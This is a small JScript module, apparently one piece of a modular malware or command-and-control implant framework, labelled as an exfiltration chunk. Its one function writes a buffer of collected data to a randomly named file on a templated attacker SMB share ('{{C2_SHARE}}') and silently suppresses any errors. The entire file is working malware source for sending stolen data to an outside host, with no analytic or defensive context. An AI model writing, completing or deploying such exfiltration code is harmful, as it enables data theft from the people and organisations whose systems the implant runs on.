// chunk: exfil/smb_write
// depends: core/emit_buffer, core/file_ops
// provides: exfil_smb
// format: jscript

function exfil_smb() {
    try {
        var dst = "{{C2_SHARE}}\\exfil_" + Math.floor(Math.random() * 99999) + ".dat";
        var f = _fso.CreateTextFile(dst, true);
        f.Write(_buf);
        f.Close();
    } catch(ex) {}
}
